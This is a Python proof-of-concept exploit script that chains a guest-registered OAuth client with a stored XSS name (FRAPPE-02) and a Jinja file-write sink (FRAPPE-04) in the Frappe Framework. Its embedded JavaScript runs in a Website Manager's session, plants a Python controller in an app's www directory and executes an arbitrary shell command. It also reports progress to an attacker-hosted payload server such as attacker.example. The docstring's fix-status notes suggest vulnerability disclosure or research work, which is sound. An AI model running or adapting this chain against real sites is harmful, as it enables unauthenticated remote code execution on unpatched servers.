#!/usr/bin/env python3
"""Frappe Guest-to-RCE browser chain: FRAPPE-02 + FRAPPE-04.

An unauthenticated Guest registers an OAuth client whose name stores an XSS
payload (FRAPPE-02). When a Website Manager opens the authorize URL, the payload
runs in their session, creates a dynamic Web Page, and drives the safe-Jinja
save() sink (FRAPPE-04) to plant an HTML page and a Python controller inside an
installed app's `www` directory. The attacker process then requests that route
and reads the command output.

Unlike the three-stage variant, this chain needs no ERPNext and no filename
traversal, only a Website Manager who opens the URL. Reviewed against Frappe
Framework 16.29.0.

Fix status: FRAPPE-02 is merged to Frappe develop but unreleased on any stable
line; FRAPPE-04 is closed from Frappe 16.33.1 / 15.120.1, so the chain needs a
site below those versions.
"""

from __future__ import annotations

import argparse
import json
import sys

from frappe_chain_common import (
    Client,
    PocError,
    add_color_argument,
    add_server_arguments,
    authorize_url,
    bad,
    banner,
    build_controller,
    build_result_page,
    build_stage_template,
    disable_color,
    emit_command_result,
    execute_route,
    fresh_route,
    good,
    info,
    normalize_origin,
    normalize_public_origin,
    register_oauth_client,
    require_fresh_http_route,
    start_payload_server,
    stored_script_tag,
    validate_installed_app_www,
    wait_for_write,
)


CREATE_PAGE = "/api/resource/Web%20Page"


def build_javascript(
    payload_base: str,
    stage_route: str,
    exec_route: str,
    stage_template: str,
    command: str,
) -> str:
    config = json.dumps(
        {
            "server": payload_base,
            "stageRoute": stage_route,
            "execRoute": exec_route,
            "stageTemplate": stage_template,
            "page": build_result_page().decode(),
            "controller": build_controller(command).decode(),
            "createPage": CREATE_PAGE,
        },
        separators=(",", ":"),
    )
    source = r'''"use strict";
(() => {
  if (globalThis.__frappe0204) return;
  globalThis.__frappe0204 = true;
  const cfg = __CONFIG__;
  const csrfToken = () => (globalThis.frappe && globalThis.frappe.csrf_token) ||
    document.querySelector('input[name="csrf_token"]')?.value;

  async function run() {
    if (document.readyState === "loading") {
      await new Promise(resolve => document.addEventListener("DOMContentLoaded", resolve, {once: true}));
    }
    const csrf = csrfToken();
    if (!csrf) throw new Error("OAuth page exposed no CSRF token");

    const documentBody = {
      doctype: "Web Page",
      title: cfg.stageRoute,
      route: cfg.stageRoute,
      published: 1,
      content_type: "HTML",
      dynamic_template: 1,
      main_section_html: cfg.stageTemplate,
      show_title: 0,
      full_width: 1
    };
    const created = await fetch(cfg.createPage, {
      method: "POST",
      credentials: "same-origin",
      headers: {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "X-Frappe-CSRF-Token": csrf
      },
      body: JSON.stringify(documentBody),
      cache: "no-store"
    });
    const createdBody = await created.json();
    if (!created.ok || createdBody?.data?.route !== cfg.stageRoute) {
      throw new Error("Web Page creation failed with HTTP " + created.status);
    }

    const files = new FormData();
    files.append("page", new Blob([cfg.page], {type: "text/html"}), cfg.execRoute + ".html");
    files.append("controller", new Blob([cfg.controller], {type: "text/x-python"}), cfg.execRoute + ".py");
    const written = await fetch("/" + encodeURIComponent(cfg.stageRoute) + "?write=1", {
      method: "POST",
      credentials: "same-origin",
      headers: {"X-Frappe-CSRF-Token": csrf},
      body: files,
      cache: "no-store"
    });
    if (!written.ok) throw new Error("Jinja file write returned HTTP " + written.status);

    await fetch(cfg.server + "/result", {
      method: "POST",
      mode: "no-cors",
      body: "written"
    });
    document.title = "FRAPPE-02 + FRAPPE-04 complete";
  }

  run().catch(error => {
    console.error("[FRAPPE-02 + FRAPPE-04]", error);
  });
})();
'''
    return source.replace("__CONFIG__", config)


def make_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="example:\n"
               "  %(prog)s --url https://frappe.example \\\n"
               "    --public-url https://attacker.example \\\n"
               "    --www-path ../apps/custom_app/custom_app/www -c id\n",
    )
    parser.add_argument("--url", required=True, metavar="URL", help="Frappe site origin")
    add_server_arguments(parser)
    parser.add_argument(
        "--www-path",
        required=True,
        metavar="PATH",
        help=(
            "writable installed-app www path as seen by the worker, for example "
            "../apps/custom_app/custom_app/www"
        ),
    )
    parser.add_argument(
        "-c", "--command", default="id", metavar="CMD", help="shell command to run (default: id)"
    )
    parser.add_argument("--timeout", type=float, default=30.0, metavar="SECS", help="HTTP timeout (default: 30)")
    parser.add_argument("--insecure", action="store_true", help="disable TLS certificate verification")
    add_color_argument(parser)
    return parser


def run(args: argparse.Namespace) -> int:
    if args.no_color:
        disable_color()
    banner("Guest OAuth XSS to Website-Manager Jinja RCE  ·  FRAPPE-02/04")
    if args.timeout <= 0:
        raise PocError("--timeout must be greater than zero")
    target = normalize_origin(args.url, "target URL")
    public_url = normalize_public_origin(args.public_url, target)
    www_path = validate_installed_app_www(args.www_path)

    run_route = fresh_route("chain0204")
    stage_route = run_route + "_stage"
    exec_route = run_route + "_exec"
    target_client = Client(target, args.timeout, args.insecure)
    require_fresh_http_route(target_client, exec_route)

    info(f"serving payload from {public_url}")
    payload = start_payload_server(
        public_url,
        args.listen_host,
        args.listen_port,
        args.certfile,
        args.keyfile,
    )
    try:
        payload.state.javascript = build_javascript(
            payload.state.payload_base,
            stage_route,
            exec_route,
            build_stage_template(exec_route, www_path),
            args.command,
        )
        client_name = stored_script_tag(payload.state.payload_base + "/payload.js")
        client_id, redirect_uri = register_oauth_client(
            target,
            payload.state.payload_base + "/callback",
            client_name,
            args.timeout,
            args.insecure,
            "frappe02-04-chain",
        )
        exploit_url = authorize_url(target, redirect_uri, client_id)
        good(f"registered guest OAuth client {client_id}")
        info("send this authorize URL to a Website Manager (no Allow click needed):")
        print(exploit_url, file=sys.stderr, flush=True)
        info(f"waiting up to {args.wait_seconds:g}s for the victim to open it")

        wait_for_write(payload, args.wait_seconds)
        good("browser stage complete; reading command output from the target")

        command_status, stdout, stderr = execute_route(target_client, exec_route)
        emit_command_result(command_status, stdout, stderr)
        return 0
    finally:
        payload.close()


def main() -> int:
    try:
        return run(make_parser().parse_args())
    except PocError as exc:
        bad(str(exc))
        return 1
    except KeyboardInterrupt:
        bad("interrupted")
        return 130


if __name__ == "__main__":
    raise SystemExit(main())
